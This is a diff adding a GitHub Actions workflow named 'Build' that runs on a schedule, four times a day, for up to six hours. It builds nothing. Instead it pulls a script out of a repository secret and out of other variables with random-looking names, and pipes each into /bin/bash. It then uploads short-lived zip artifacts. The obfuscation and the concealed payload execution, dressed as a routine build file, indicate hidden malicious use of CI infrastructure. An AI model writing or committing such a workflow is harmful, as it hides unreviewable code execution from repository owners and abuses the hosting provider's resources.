@@ -1,0 +1,32 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '4 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          xddzn63118: ${{ secrets.xddzn63118 }}
+        run: |
+          printf '%s' "$xddzn63118" | jq -r .uvq28 | /bin/bash
+          echo $mq87762 | jq -r .ptcw78343 | /bin/bash
+          printf '%s' "$hpxt80" | jq -r .mfts077 | /bin/bash
+          printf '%s' "$unvkf00" | jq -r .xngh702 | /bin/bash
+          echo $y07808 | jq -r .wxsno7 | /bin/bash
+          printf '%s' "$uhuk24" | jq -r .l9380 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: JEwQDLIq
+          path: "*.zip"
+          retention-days: 1
